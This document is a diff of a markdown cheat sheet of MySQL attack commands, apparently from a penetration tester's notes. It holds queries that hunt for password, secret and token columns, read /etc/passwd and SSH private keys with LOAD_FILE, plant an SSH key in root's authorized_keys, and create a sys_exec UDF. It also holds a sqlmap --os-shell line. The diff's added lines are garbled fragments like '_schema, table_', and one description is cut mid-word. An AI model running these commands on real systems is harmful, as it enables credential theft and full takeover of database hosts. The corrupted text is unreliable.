@@ -3,7 +3,7 @@ id: "ao5owyigfmptladjv"
 title: "mysql3"
 description: ""
 tags: []
-order: 14
+order: "14"
 createdAt: "2026-05-31T09:40:43.675Z"
 updatedAt: "2026-05-31T09:40:54.297Z"
 ---
@@ -182,6 +182,8 @@ SHOW GRANTS FOR '$USER'@'%';
 SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','performance_schema','mysql','sys');
 ```
 
+_schema, table_
+
 **Tags:** mysql, enumeration, authenticated, privileges
 <!-- cmd: {"id":"rmft5dl5rmptlalgu","language":"bash","sectionId":"909jfoqbtmptlalba","tags":["mysql","enumeration","authenticated","privileges"]} -->
 
@@ -235,6 +237,8 @@ mysql -h $TARGET -u $USER -p$PASS -e "SELECT * FROM $DATABASE.$TABLE LIMIT 100;"
 SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';
 ```
 
+_schema, table_
+
 **Tags:** mysql, datadump, exfiltration, credentials
 <!-- cmd: {"id":"jghghgrvcmptlali6","language":"bash","sectionId":"71tee5eu1mptlalbf","tags":["mysql","datadump","exfiltration","credentials"]} -->
 
@@ -254,7 +258,7 @@ SELECT * FROM $DATABASE.users LIMIT 50;
 SELECT LOAD_FILE('/etc/passwd');
 ```
 
-_File Read (FILE Privilege) Read local files via LOAD_FILE if FILE privilege is granted._
+_File Read (FILE Privilege) Read local files via LOAD_
 
 **Tags:** mysql, fileread, lfi, privilege-abuse
 <!-- cmd: {"id":"ncxtmfokjmptlaliq","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->
@@ -264,6 +268,8 @@ _File Read (FILE Privilege) Read local files via LOAD_FILE if FILE privilege is 
 SELECT LOAD_FILE('/root/.ssh/id_rsa');
 ```
 
+_FILE('/root/.ssh/id_
+
 **Tags:** mysql, fileread, lfi, privilege-abuse
 <!-- cmd: {"id":"vmyept9ptmptlaliv","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->
 
@@ -271,6 +277,8 @@ SELECT LOAD_FILE('/root/.ssh/id_rsa');
 ```bash
 SELECT LOAD_FILE('/home/$USER/.ssh/id_rsa');
 ```
+
+_FILE('/home/$USER/.ssh/id_
 
 **Tags:** mysql, fileread, lfi, privilege-abuse
 <!-- cmd: {"id":"8tg0ytjlumptlalj1","language":"bash","sectionId":"6udbtl4urmptlalbl","tags":["mysql","fileread","lfi","privilege-abuse"]} -->
@@ -325,6 +333,8 @@ SELECT "ssh-rsa AAAA..." INTO OUTFILE '/root/.ssh/authorized_keys';
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
+_file_
+
 **Tags:** mysql, filewrite, webshell, rce
 <!-- cmd: {"id":"u8no2u78amptlalk8","language":"bash","sectionId":"lfdowf4l8mptlalbq","tags":["mysql","filewrite","webshell","rce"]} -->
 
@@ -346,6 +356,8 @@ _UDF (User Defined Functions) — RCE Escalate to OS command execution via UDF i
 SHOW VARIABLES LIKE 'secure_file_priv';
 ```
 
+_file_
+
 **Tags:** mysql, udf, rce, privesc, exploitation
 <!-- cmd: {"id":"ts86e7l4tmptlalkx","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->
 
@@ -361,6 +373,8 @@ sqlmap -u "$URL" --dbms=mysql --os-shell
 ```bash
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 ```
+
+_exec RETURNS INT SONAME 'lib_
 
 **Tags:** mysql, udf, rce, privesc, exploitation
 <!-- cmd: {"id":"nnd661iejmptlall5","language":"bash","sectionId":"r6pu1fdh1mptlalbw","tags":["mysql","udf","rce","privesc","exploitation"]} -->
@@ -476,6 +490,8 @@ SELECT user, host FROM mysql.user WHERE host='%';
 SELECT user, host FROM mysql.user WHERE authentication_string='' OR authentication_string IS NULL;
 ```
 
+_string='' OR authentication_
+
 **Tags:** mysql, misconfiguration, hardening
 <!-- cmd: {"id":"nl57ki8fjmptlalnl","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->
 
@@ -483,6 +499,8 @@ SELECT user, host FROM mysql.user WHERE authentication_string='' OR authenticati
 ```bash
 SELECT user, host, Grant_priv, Super_priv, File_priv FROM mysql.user WHERE Grant_priv='Y' OR Super_priv='Y' OR File_priv='Y';
 ```
+
+_priv, Super_
 
 **Tags:** mysql, misconfiguration, hardening
 <!-- cmd: {"id":"p945dcedymptlalnr","language":"bash","sectionId":"8wco584szmptlalc7","tags":["mysql","misconfiguration","hardening"]} -->
